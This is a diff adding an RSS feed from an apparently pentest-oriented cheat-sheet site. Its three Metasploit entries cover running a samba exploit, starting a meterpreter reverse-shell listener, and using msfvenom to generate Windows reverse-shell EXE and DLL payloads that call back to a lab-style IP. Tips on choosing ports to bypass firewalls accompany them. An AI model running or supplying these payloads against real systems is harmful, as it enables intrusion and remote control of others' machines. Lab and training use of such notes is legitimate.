@@ -1,0 +1,32 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Msfconsole on TLDRBins</title>
+    <link>https://tldrbins.github.io/@msfconsole/</link>
+    <description>Recent content in Msfconsole on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@msfconsole/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Metasploit</title>
+      <link>https://tldrbins.github.io/metasploit/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/metasploit/</guid>
+      <description>Metasploit Start Metasploit msfconsole -q Basic Commands # Return to previous page back # Upgrade session sessions -u # quit metasploit exit Search Exploit # For example: samba search samba # Choose by #num use 15 # Choose by full path use exploit/multi/samba/usermap_script # Show exploit settings options # Set option, e.g. set rhosts 10.10.11.10 set lhost 10.10.14.10 set lport 1337 # Run exploit run Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter</description>
+    </item>
+    <item>
+      <title>Metasploit Listener</title>
+      <link>https://tldrbins.github.io/metasploit_listener/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/metasploit_listener/</guid>
+      <description>Start a Metasploit Listener msfconsole -q use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 10.10.14.10 set lport 443 run Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules&#xA;If the shell die immediately, we can try to migrate it to another process # Create a automigrate.rc script run post/windows/manage/migrate msfconsole -q use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 10.10.14.10 set lport 443 set AutoRunScript multi_console_command -r automigrate.</description>
+    </item>
+    <item>
+      <title>Metasploit Shellcode</title>
+      <link>https://tldrbins.github.io/metasploit_shellcode/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/metasploit_shellcode/</guid>
+      <description>Generate Metasploit Shellcode Windows x64 EXE msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.exe Windows x86 EXE # Staged msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.exe # Stageless msfvenom -p windows/shell_reverse_tcp -a x86 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 EXITFUNC=thread &amp;gt; rev.exe Windows x64 DLL msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f dll --platform windows LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.dll Note: These will be flagged by AV Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules</description>
+    </item>
+  </channel>
+</rss>
